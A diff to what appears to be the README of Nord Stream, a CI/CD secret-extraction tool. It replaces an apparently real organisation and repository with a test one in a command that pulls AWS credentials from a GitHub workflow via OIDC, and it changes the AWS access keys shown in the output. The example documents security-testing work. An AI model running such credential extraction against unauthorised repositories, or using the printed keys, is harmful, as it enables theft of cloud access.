@@ -387,8 +387,8 @@ If you come across such a workflow, this means that the repository might be conf
 Nord Stream is able to deploy a pipeline to retrieve such access token with the following options:
 
 ```bash
-$ nord-stream.py github --token "$PAT" --org TotalenergiesCode --repo awslz-platform --aws-role 'arn:aws:iam::133333333337:role/S3Access/CustomRole' --aws-region us-east-1 --force
-[+] "TotalEnergiesCode/awslz-platform"
+$ nord-stream.py github --token "$PAT" --org Synacktiv --repo TestCICD --aws-role 'arn:aws:iam::133333333337:role/S3Access/CustomRole' --aws-region us-east-1 --force
+[+] "Synacktiv/TestCICD"
 [*] Running OIDC AWS credentials generation workflow
 [*] Getting workflow output
 [!] Workflow not finished, sleeping for 15s
@@ -397,8 +397,8 @@ $ nord-stream.py github --token "$PAT" --org TotalenergiesCode --repo awslz-plat
 AWS_DEFAULT_REGION=us-east-1
 AWS_SESSION_TOKEN=IQoJb3[...]KMs0/QB6
 AWS_REGION=us-east-1
-AWS_ACCESS_KEY_ID=ASIA5ABC7XDMAX2KNNWO
-AWS_SECRET_ACCESS_KEY=7KJLCjdJKqlmLKDHI9F7SH6SjSQBX62Sjm12xXDA
+AWS_ACCESS_KEY_ID=ASIA5ABC8XDMAP2ANNWO
+AWS_SECRET_ACCESS_KEY=7KJLCjdJKqlpLKDAI9F7SH6SjSQBX68Sjm13xXDA
 ```
 
 #### Help
